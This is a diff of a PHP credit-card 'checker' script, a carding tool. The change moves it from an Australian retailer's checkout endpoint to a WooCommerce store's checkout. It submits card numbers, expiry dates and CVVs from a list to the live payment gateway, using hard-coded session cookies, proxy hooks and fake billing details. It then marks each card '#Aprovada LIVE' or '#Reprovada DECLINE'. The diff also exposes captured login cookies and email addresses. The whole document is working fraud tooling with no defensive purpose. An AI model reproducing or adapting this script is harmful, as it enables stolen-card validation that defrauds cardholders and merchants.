@@ -46,10 +46,10 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
-// If(strlen($ano) > 2)
-// {
-//   $ano = substr($ano,2,2);
-// }
+If(strlen($ano) > 2)
+{
+  $ano = substr($ano,2,2);
+}
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -193,7 +193,7 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.shavershop.com.au/on/demandware.store/Sites-Shaver_Shop_au-Site/en_AU/SPCOrder-Submit');
+curl_setopt($ch, CURLOPT_URL, 'https://zodianz.com/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -225,16 +225,16 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: application/json, text/javascript, */*; q=0.01',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/json',
-'cookie: __cfduid=d476479d706a9098039eb3ee3a05c7b601590342176; cqcid=acFGaNnBj7LMJNMdEvaeSYobHJ; dwanonymous_ae4f5672fcdba78701858757b10b0f04=acFGaNnBj7LMJNMdEvaeSYobHJ; __cq_dnt=0; dw_dnt=0; BVImplmain_site=19316; dw=1; dw_cookies_accepted=1; leadGenerationPopUp=true; __cqact=%5B%7B%22activityType%22%3A%22customerSignup%22%2C%22parameters%22%3A%7B%22cookieId%22%3A%22acFGaNnBj7LMJNMdEvaeSYobHJ%22%2C%22userId%22%3A%22ODI8BjeCIV7bqOi369qnPiJ9rVcfKCfbPKbKd6KAORw%3D%22%2C%22emailId%22%3A%22pubgkittu%40gmail.com%22%2C%22realm%22%3A%22ABCZ%22%2C%22siteId%22%3A%22Shaver_Shop_au%22%2C%22instanceType%22%3A%22prd%22%7D%7D%5D; sid=zy-T2yJI_DIaaxJYwLa7BZMZKJHIoWiLTRI; dwac_f5c2891e49332fe2bfa511a0d9=zy-T2yJI_DIaaxJYwLa7BZMZKJHIoWiLTRI%3D|dw-only|||AUD|false|Australia%2FSydney|true; dwsid=y3YAVOXrUwRF7WvhKKM_JJdAux4PAse9EpTYWzbqktalAX7f955OZICKc5nRYZBLMvsYNse89gMMvnWsyYvurA==',
-'origin: https://www.shavershop.com.au',
-'referer: https://www.shavershop.com.au/checkout',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: PHPSESSID=a7acf4b9b36ed2adf295fcbf0594d81d; wordpress_logged_in_b9ae7e7c08ca63d7790dbd22f9ddd964=hotshot69%7C1591104686%7CROZ8vLyBRWgJhq8cq2rTSEs8OS7SseImWUct1rDpbcp%7C3a66325483a7a248938a861801054b5ab4d7471f6c4ed5d22fa4d21def65c0d3; _wp_session=cea2ce1dc209804311c2c66e96f2f2bc%7C%7C1590433318%7C%7C1650006118; wfwaf-authcookie-a05d541a58682044948ca1c492a67fb3=1163%7C%7C5e54b8ae5c3c3e6ff185afc347e097f7f3da29ec2d6835d5e025286f475fe1e6; wpSGCacheBypass=1; JCS_INENREF=https%3A//zodianz.com/cart/; JCS_INENTIM=1590390137888; _wpss_p_=N%3A2%20%7C%20WzFdW0Nocm9tZSBQREYgUGx1Z2luXSBbMl1bQ2hyb21lIFBERiBWaWV3ZXJdIA%3D%3D; woocommerce_items_in_cart=1; wp_woocommerce_session_b9ae7e7c08ca63d7790dbd22f9ddd964=1163%7C%7C1590562954%7C%7C1590559354%7C%7C4c8367874af4b62b6135ebe49e6692fb; woocommerce_cart_hash=584324920eabf25e5c6595513cec987f; _wpss_h_=6',
+'origin: https://zodianz.com',
+'referer: https://zodianz.com/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethod":"CREDIT_CARD","addEmailToList":false,"creditCard":{"owner":"Vincent Warner","number":"'.$cc.'","type":"Visa","expiration":{"month":'.$mes1.',"year":'.$ano.'},"cvn":"'.$cvv.'","saveCard":false,"deviceFingerprint":""}}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name='.$nombre.'&billing_last_name='.$apellido.'&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=05182641524&billing_email=vvarner3%40gmail.com&order_comments=&payment_method=first_data_payeezy_gateway_credit_card&wc-first-data-payeezy-gateway-credit-card-account-number='.$cc.'&wc-first-data-payeezy-gateway-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-first-data-payeezy-gateway-credit-card-csc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=445cc98ccb&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&0acb1f222af335f4838db2828d210d45=6f2277cdb80cb4dd04ced63e0a5e68a9');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -253,17 +253,17 @@ $message = trim(strip_tags(getstr($result,'"message":"','"')));
 //////////////////////// BIN INFO ////////////////////////////////
 
 /////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"error"')){
-       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+if(strpos($result,'"result":"success"')){
+    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
 
 
    }
-elseif(strpos($result,'Insufficient Funds')){
-  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
-   }
+// elseif(strpos($result,'Insufficient Funds')){
+//   echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+//    }
 else {
 
-  echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ DECLINE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
 
 // updatecart();
 }
